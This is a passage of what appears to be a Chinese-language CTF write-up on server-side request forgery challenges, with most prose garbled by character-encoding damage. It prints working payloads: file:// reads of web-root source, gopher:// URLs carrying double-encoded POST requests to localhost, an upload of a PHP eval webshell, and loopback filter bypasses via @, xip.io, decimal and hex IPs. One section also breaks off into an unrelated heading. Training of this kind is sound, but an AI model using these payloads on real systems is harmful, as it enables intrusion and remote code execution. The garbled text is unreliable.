class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>] == <span class="variable">$key</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;key&quot;</span>&gt;</span><br><span class="line">&lt;!-- Debug: key=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$key</span>;<span class="meta">?&gt;</span>--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šé¢çš„å¯ä»¥çœ‹å‡ºï¼Œflag.phpæºç ä¸­æ²¡æœ‰æäº¤æŒ‰é’®ï¼Œæ‰€ä»¥å°±æ˜¯è®©æˆ‘ä»¬æ„é€ postè¯·æ±‚ï¼Œå°†è¿™ä¸ªkeyå‘é€è¿‡å»</p><p>gopheråè®®æ„é€ postè¯·æ±‚</p><blockquote><p>æ³¨æ„ï¼šåœ¨æ„é€ postè¯·æ±‚æ—¶ï¼Œ<strong>POST,Hostã€Content-Typeå’ŒContent-Length</strong>è¿™å››ä¸ªå‚æ•°ä¸èƒ½å°‘ï¼Œå¦‚æœå°‘äº†ï¼Œä¼šæŠ¥é”™ã€‚è€ŒGETè¯·æ±‚åˆ™ä¸ç”¨</p><p><strong>POSTæ•°æ®åŒ…:éœ€è¦å’Œè¯·æ±‚å¤´è¦ç©ºä¸€è¡Œ</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Length: 36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">key=b37c305312b2f355c3040e15b6345c03</span><br></pre></td></tr></table></figure><blockquote><p>Content-Length: 36å°±æ˜¯ä½ è¦å‘é€ä¿¡æ¯çš„é•¿åº¦</p></blockquote><p>å…¶ä¸­%0dè¡¨ç¤ºå›è½¦ï¼Œ%0aè¡¨ç¤ºæ¢è¡Œ</p><p>å…¶ä¸­å›è½¦çš„ä½œç”¨æ˜¯ç§»åŠ¨å…‰æ ‡è‡³è¯¥è¡Œçš„èµ·å§‹ä½ç½®ï¼Œæ¢è¡Œè‡³ä¸‹ä¸€è¡Œè¡Œçš„é¦–èµ·å§‹ä½ç½®</p><blockquote><p>æ³¨ï¼šContent-Lengthé•¿åº¦éœ€è¦å’Œä¼ å…¥å†…å®¹çš„é•¿åº¦ç›¸ç­‰ã€‚</p><p>å…³äºurlç¼–ç ï¼š</p><p>1.é—®å·(?)éœ€è¦è½¬ç ä¸ºurlç¼–ç ï¼Œä¹Ÿå°±æ˜¯%3f</p><p>2.å›è½¦æ¢è¡Œè¦å˜ä¸º%0d%0a</p><p>3.åœ¨HTTPåŒ…çš„æœ€åè¦åŠ %0d%0aï¼Œä»£è¡¨æ¶ˆæ¯ç»“æŸ</p></blockquote><p>gopheråè®®æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1POST%20%2Fflag.php%20HTTP%2F1.1%0AHost%3A%20127.0.0.1%3A80%0AContent-Length%3A%2036%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0A%0Akey%3Db37c305312b2f355c3040e15b6345c03</span><br></pre></td></tr></table></figure><p>å†è¿›è¡Œä¸€æ¬¡ç¼–ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST%2520%252Fflag.php%2520HTTP%252F1.1%250AHost%253A%2520127.0.0.1%253A80%250AContent-Length%253A%252036%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250A%250Akey%253Db37c305312b2f355c3040e15b6345c03</span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥æ„é€ ï¼Œå¾—åˆ°flag</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230925222620970.png" alt="image-20230925222620970"></p><h4 id="ä¸Šä¼ æ–‡ä»¶"><a href="#ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶"></a>ä¸Šä¼ æ–‡ä»¶</h4><p><strong>é¢˜ç›®æè¿°</strong>ï¼šè¿™æ¬¡éœ€è¦ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åˆ°flag.phpäº†.ç¥ä½ å¥½è¿</p><blockquote><p><strong>çŸ¥è¯†ç‚¹ï¼šgopheråè®®ï¼Œæ–‡ä»¶ä¸Šä¼ ï¼Œfileåè®®</strong></p></blockquote><p>è¿™é“é¢˜å’Œpostå·®ä¸å¤šï¼Œå…¶å®å°±æ˜¯ä¸Šä¸€é“é¢˜postä¼ é€’keyï¼Œè¿™é“é¢˜postä¸Šä¼ æ–‡ä»¶</p><p>è¿˜æ˜¯ä¸Šé¢çš„è§£é¢˜æ€è·¯ï¼Œåˆ©ç”¨fileåè®®å°†æºç è¯»å‡ºæ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Upload Webshell</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230926085715357.png" alt="image-20230926085715357"></p><p>å‘ç°å¿…é¡»ä¸Šä¼ æ–‡ä»¶ï¼Œå‘ç°æ²¡æœ‰æäº¤æŒ‰é’®ï¼Œæˆ‘ä»¬æ‰‹åŠ¨å¢åŠ ä¸€ä¸ªï¼Œæ”¹ä¸€ä¸‹ä»£ç </p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230926091209425.png" alt="image-20230926091209425"></p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230926091109889.png" alt="image-20230926091109889"></p><p>æˆ‘ä»¬éšä¾¿ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬çš„æ–‡ä»¶ï¼Œç„¶åæŠ“åŒ…ï¼Œå¾—åˆ°å¦‚ä¸‹å›¾æ‰€ç¤ºçš„ä¸€ä¸ªæ•°æ®åŒ…ï¼š</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230926091954625.png" alt="image-20230926091954625"></p><p>è¯·æ±‚åŒ…ä¸€æ¬¡æ¢è¡Œå’Œä¸¤æ¬¡æ¢è¡Œéƒ½éœ€è¦è¿›è¡Œä¸¤æ¬¡urlç¼–ç <br>æ¢è¡ŒäºŒæ¬¡ç¼–ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: challenge-1a2dac8b881c5d59.sandbox.ctfhub.com:10800</span><br><span class="line">Content-Length: 325</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://challenge-1a2dac8b881c5d59.sandbox.ctfhub.com:10800</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryo7632KHgSL8rYE19</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://challenge-1a2dac8b881c5d59.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryo7632KHgSL8rYE19</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt; </span><br><span class="line">------WebKitFormBoundaryo7632KHgSL8rYE19</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">é»æ„ªæ°¦</span><br><span class="line">------WebKitFormBoundaryo7632KHgSL8rYE19--</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520challenge-1a2dac8b881c5d59.sandbox.ctfhub.com%253A10800%250D%250AContent-Length%253A%2520325%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-1a2dac8b881c5d59.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D----WebKitFormBoundaryo7632KHgSL8rYE19%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F114.0.5735.199%2520Safari%252F537.36%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Favif%252Cimage%252Fwebp%252Cimage%252Fapng%252C*%252F*%253Bq%253D0.8%252Capplication%252Fsigned-exchange%253Bv%253Db3%253Bq%253D0.7%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-1a2dac8b881c5d59.sandbox.ctfhub.com%253A10800%252F%253Furl%253D127.0.0.1%252Fflag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryo7632KHgSL8rYE19%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522test.php%2522%250D%250AContent-Type%253A%2520application%252Foctet-stream%250D%250A%250D%250A%253C%253Fphp%2520%2540eval(%2524_POST%255B&#x27;cmd&#x27;%255D)%253B%253F%253E%2520%250D%250A------WebKitFormBoundaryo7632KHgSL8rYE19%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E9%258E%25BB%25E6%2584%25AA%25E6%25B0%25A6%250D%250A------WebKitFormBoundaryo7632KHgSL8rYE19--</span><br></pre></td></tr></table></figure><p>è¾“å…¥payloadï¼Œå¾—åˆ°flag</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230926092845886.png" alt="image-20230926092845886"></p><h4 id="FastCGIåè®®"><a href="#FastCGIåè®®" class="headerlink" title="FastCGIåè®®"></a>FastCGIåè®®</h4><p><strong>é¢˜ç›®æè¿°</strong>ï¼šè¿™æ¬¡.æˆ‘ä»¬éœ€è¦æ”»å‡»ä¸€ä¸‹fastcgiåè®®å’¯.ä¹Ÿè®¸é™„ä»¶çš„æ–‡ç« ä¼šå¯¹ä½ æœ‰ç‚¹å¸®åŠ©</p><blockquote><p>é¦–å…ˆäº†è§£ä¸€ä¸‹FastCGIåè®®</p><p>FastCGIæ˜¯ä¸€ä¸ªé€šä¿¡åè®®ï¼Œå’ŒHTTPåè®®ä¸€æ ·ï¼Œéƒ½æ˜¯è¿›è¡Œæ•°æ®äº¤æ¢çš„ä¸€ä¸ªé€šé“ã€‚</p><p>HTTPåè®®æ˜¯æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¸­é—´ä»¶è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ï¼Œæµè§ˆå™¨å°†HTTPå¤´å’ŒHTTPä½“ç”¨æŸä¸ªè§„åˆ™ç»„è£…æˆæ•°æ®åŒ…ï¼Œä»¥TCPçš„æ–¹å¼å‘é€åˆ°æœåŠ¡å™¨ä¸­é—´ä»¶ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶æŒ‰ç…§è§„åˆ™å°†æ•°æ®åŒ…è§£ç ï¼Œå¹¶æŒ‰è¦æ±‚æ‹¿åˆ°ç”¨æˆ·éœ€è¦çš„æ•°æ®ï¼Œå†ä»¥HTTPåè®®çš„è§„åˆ™æ‰“åŒ…è¿”å›ç»™æœåŠ¡å™¨ã€‚</p><p>ç±»æ¯”HTTPåè®®æ¥è¯´ï¼ŒFastCGIåè®®åˆ™æ˜¯æœåŠ¡å™¨ä¸­é—´ä»¶å’ŒæŸä¸ªè¯­è¨€åç«¯è¿›è¡Œæ•°æ®äº¤æ¢çš„åè®®ã€‚FastCGIåè®®ç”±å¤šä¸ªrecordç»„æˆï¼Œrecordä¹Ÿæœ‰headerå’Œbodyä¸€è¯´ï¼ŒæœåŠ¡å™¨ä¸­é—´ä»¶å°†è¿™ä¸¤è€…æŒ‰ç…§FastCGIçš„è§„åˆ™å°è£…å¥½å‘é€ç»™è¯­è¨€åç«¯ï¼Œè¯­è¨€åç«¯è§£ç ä»¥åæ‹¿åˆ°å…·ä½“æ•°æ®ï¼Œè¿›è¡ŒæŒ‡å®šæ“ä½œï¼Œå¹¶å°†ç»“æœå†æŒ‰ç…§è¯¥åè®®å°è£…å¥½åè¿”å›åˆ°æœåŠ¡å™¨ä¸­é—´ä»¶ã€‚</p><p>å’ŒHTTPå¤´ä¸åŒï¼Œrecordçš„å¤´å›ºå®š8ä¸ªå­—èŠ‚ï¼Œbodyæ˜¯ç”±å¤´çš„contentLengthæŒ‡å®šï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">/*Header*/</span><br><span class="line">unsigned char version; //ç‰ˆæœ¬</span><br><span class="line">unsigned char typeï¼› //æœ¬æ¬¡recordçš„ç±»å‹</span><br><span class="line">unsigned char requestIdB1; // æœ¬æ¬¡recordå¯¹åº”çš„è¯·æ±‚id</span><br><span class="line"></span><br><span class="line">  unsigned char requestIdB0;</span><br><span class="line">  unsigned char contentLengthB1; // bodyä½“çš„å¤§å°</span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; // é¢å¤–å—å¤§å°</span><br><span class="line">  unsigned char reserved; </span><br><span class="line"> </span><br><span class="line">  /* Body */</span><br><span class="line">  unsigned char contentData[contentLength];</span><br><span class="line">  unsigned char paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Recordï¼›</span><br></pre></td></tr></table></figure><p>å¤´ç”±8ä¸ªucharç±»å‹ç»„æˆï¼Œæ¯ä¸ªå˜é‡1å­—èŠ‚ã€‚å…¶ä¸­ï¼ŒrequestIDå ä¸¤ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªå”¯ä¸€çš„æ ‡å¿—idï¼Œä»¥é¿å…å¤šä¸ªè¯·æ±‚ä¹‹é—´çš„å½±å“ï¼ŒcontentLengthå ä¸¤ä¸ªå­—èŠ‚ï¼Œè¡¨ç¤ºbodyçš„å¤§å°ã€‚</p><p>è¯­è¨€ç«¯è§£æäº†FastCGIå¤´ä»¥åï¼Œæ‹¿åˆ°contentLength,ç„¶åå†åœ¨TCPæµé‡Œè¯»å–å¤§å°ç­‰äºcontentLengthçš„æ•°æ®ï¼Œè¿™å°±æ˜¯bodyä½“ã€‚</p><p>bodyåé¢è¿˜æœ‰ä¸€æ®µé¢å¤–çš„æ•°æ®(padding),å…¶é•¿åº¦ç”±å¤´çš„paddingLengthæŒ‡å®šï¼Œèµ·ä¿ç•™ä½œç”¨ã€‚ä¸éœ€è¦è¯¥paddingçš„æ—¶å€™ï¼Œå°†å…¶é•¿åº¦è®¾ç½®ä¸º0å³å¯ã€‚</p><p>ç”±æ­¤å¯è§ï¼Œä¸€ä¸ªFastCGI recordç»“æ„æœ€å¤§æ”¯æŒçš„bodyå¤§å°æ˜¯2^16,å³65536å­—èŠ‚ã€‚</p></blockquote><p>æ‰“å¼€é¢˜ç›®ï¼Œè´´äº†ä¸€ä¸ªé™„ä»¶ï¼Œé™„ä»¶æ˜¯ä¸€ä¸ªåšå®¢çš„åœ°å€ï¼š</p><h2 id="07å¸¸è§çš„ç»•è¿‡æ–¹å¼"><a href="#07å¸¸è§çš„ç»•è¿‡æ–¹å¼" class="headerlink" title="07å¸¸è§çš„ç»•è¿‡æ–¹å¼"></a>07å¸¸è§çš„ç»•è¿‡æ–¹å¼</h2><h4 id="1-ç»•è¿‡"><a href="#1-ç»•è¿‡" class="headerlink" title="1.@ç»•è¿‡"></a>1.@ç»•è¿‡</h4><p>URLçš„å®Œæ•´æ ¼å¼æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[åè®®ç±»å‹]://[è®¿é—®èµ„æºéœ€è¦çš„å‡­è¯ä¿¡æ¯]@[æœåŠ¡å™¨åœ°å€]:[ç«¯å£å·]/[èµ„æºå±‚çº§UNIXæ–‡ä»¶è·¯å¾„][æ–‡ä»¶å]?[æŸ¥è¯¢]#[ç‰‡æ®µID]</span><br></pre></td></tr></table></figure><h3 id="ç¬¬ä¸‰éƒ¨åˆ†-bypass"><a href="#ç¬¬ä¸‰éƒ¨åˆ†-bypass" class="headerlink" title="ç¬¬ä¸‰éƒ¨åˆ†(bypass)"></a>ç¬¬ä¸‰éƒ¨åˆ†(bypass)</h3><h4 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h4><p><strong>é¢˜ç›®æè¿°ï¼š</strong>è¯·æ±‚çš„URLä¸­å¿…é¡»åŒ…å«<a href="http://notfound.ctfhub.com,æ¥å°è¯•åˆ©ç”¨urlçš„ä¸€äº›ç‰¹æ®Šåœ°æ–¹ç»•è¿‡è¿™ä¸ªé™åˆ¶å§/">http://notfound.ctfhub.comï¼Œæ¥å°è¯•åˆ©ç”¨URLçš„ä¸€äº›ç‰¹æ®Šåœ°æ–¹ç»•è¿‡è¿™ä¸ªé™åˆ¶å§</a></p><p>æ‰“å¼€é¢˜ç›®è®¿é—®æç¤ºï¼Œ</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230928084256321.png" alt="image-20230928084256321"></p><p>å…ˆå°è¯•ç›´æ¥è®¿é—®ï¼Œå‘ç°æ— æ³•è¿”å›</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230928084446048.png" alt="image-20230928084446048"></p><p>é¢˜ç›®æ˜¯URL Bypassï¼Œæˆ‘ä»¬è€ƒè™‘æ€ä¹ˆç»•è¿‡è¿™ä¸ªåŸŸå</p><p>æœ‰ä¸¤ç§æ–¹æ³•</p><p>æ–¹æ³•ä¸€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com@127.0.0.1</span><br><span class="line">ç­‰äºhttp://127.0.0.1</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼š</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230928085610015.png" alt="image-20230928085610015"></p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230928085531043.png" alt="image-20230928085531043"></p><h4 id="2-xip-io-å’Œ-xip-name-ç»•è¿‡"><a href="#2-xip-io-å’Œ-xip-name-ç»•è¿‡" class="headerlink" title="2.xip.io å’Œ xip.name ç»•è¿‡"></a>2.xip.io å’Œ xip.name ç»•è¿‡</h4><p>æ–¹æ³•äºŒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com.127.0.0.1.xip.io/phpinfo.php</span><br><span class="line">ç­‰äº127.0.0.1/phpinfo.php</span><br></pre></td></tr></table></figure><p>æ³›åŸŸåè§£æï¼Œæ— éœ€é…ç½®ï¼Œå°†è‡ªå®šä¹‰çš„ä»»ä½•åŸŸåè§£æåˆ°æŒ‡å®šçš„<code>IP</code>åœ°å€ã€‚å‡è®¾ä½ çš„<code>IP</code>åœ°å€æ˜¯<code>10.0.0.1</code>ï¼Œä½ åªéœ€ä½¿ç”¨<code>å‰ç¼€åŸŸå+IPåœ°å€+xip.io</code>å³å¯å®Œæˆç›¸åº”è‡ªå®šä¹‰åŸŸåè§£æã€‚xip.name åœ¨ä½¿ç”¨ä¸Šä¸<code>xip.io</code>ä¸€è‡´</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230928092441836.png" alt="image-20230928092441836"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</span><br><span class="line">æˆ–</span><br><span class="line">?url=http://notfound.ctfhub.com.127.0.0.1.xip.io/flag.php</span><br></pre></td></tr></table></figure><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230928090436268.png" alt="image-20230928090436268"></p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230928090622828.png" alt="image-20230928090622828"></p><h4 id="3-è½¬åŒ–æˆæ•°å­—IP"><a href="#3-è½¬åŒ–æˆæ•°å­—IP" class="headerlink" title="3.è½¬åŒ–æˆæ•°å­—IP"></a>3.è½¬åŒ–æˆæ•°å­—IP</h4><h4 id="æ•°å­—IP-Bypass"><a href="#æ•°å­—IP-Bypass" class="headerlink" title="æ•°å­—IP Bypass"></a>æ•°å­—IP Bypass</h4><p><strong>é¢˜ç›®æè¿°</strong>:è¿™æ¬¡banæ‰äº†127ä»¥åŠ172.ä¸èƒ½ä½¿ç”¨ç‚¹åˆ†åè¿›åˆ¶çš„IPäº†ã€‚ä½†æ˜¯åˆè¦è®¿é—®127.0.0.1ã€‚è¯¥æ€ä¹ˆåŠå‘¢</p><p>å…ˆè®¿é—®127.0.0.1ï¼Œå‘ç°è¢«banï¼ŒåŒæ—¶è¢«banæ‰äº†127ã€172ã€@</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230928094624163.png" alt="image-20230928094624163"></p><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚æœæƒ³è®¿é—®127.0.0.1ï¼Œå°±è¦æ‰¾åˆ«çš„æ–¹æ³•ï¼Œä¸èƒ½ç›´æ¥è®¿é—®ï¼Œæœ‰ä¸‰ç§æ–¹æ³•</p><p><strong>æ–¹æ³•ä¸€:ä½¿ç”¨æ•°å­—IP</strong></p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å·¥å…·å°†IPè½¬ä¸ºintç±»å‹</p><p>å·¥å…·é“¾æ¥ï¼š<a href="https://www.bejson.com/convert/ip2int/">https://www.bejson.com/convert/ip2int/</a></p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230928095123364.png" alt="image-20230928095123364"></p><p>127.0.0.1çš„æ•°å­—ipä¸ºï¼š<code>2130706433</code></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ï¼Ÿurl=http://2130706433/flag.php</span><br></pre></td></tr></table></figure><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230928095702953.png" alt="image-20230928095702953"></p><h4 id="4-è¿›åˆ¶è½¬æ¢"><a href="#4-è¿›åˆ¶è½¬æ¢" class="headerlink" title="4.è¿›åˆ¶è½¬æ¢"></a>4.è¿›åˆ¶è½¬æ¢</h4><p><strong>æ–¹æ³•äºŒï¼šè½¬16è¿›åˆ¶</strong></p><p>åœ¨çº¿è½¬æ¢åœ°å€ï¼š<a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">https://tool.520101.com/wangluo/jinzhizhuanhuan/</a></p><p>127.0.0.1è½¬æ¢æˆ16è¿›åˆ¶ä¸ºï¼š<code>0x7F000001</code></p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230928100020374.png" alt="image-20230928100020374"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://0x7F000001/flag.php</span><br></pre></td></tr></table></figure><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230928100224617.png" alt="image-20230928100224617"></p><h4 id="302è·³è½¬Bypass"><a href="#302è·³è½¬Bypass" class="headerlink" title="302è·³è½¬Bypass"></a>302è·³è½¬Bypass</h4><p><strong>é¢˜ç›®æè¿°</strong>ï¼šSSRFä¸­æœ‰ä¸ªå¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯è¯·æ±‚å¯èƒ½ä¼šè·Ÿéš302è·³è½¬ï¼Œå°è¯•åˆ©ç”¨è¿™ä¸ªæ¥ç»•è¿‡å¯¹IPçš„æ£€æµ‹è®¿é—®åˆ°ä½äº127.0.0.1çš„flag.phpå§</p><p>è¯»å–ç½‘ç«™index.phpæºä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/index.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span 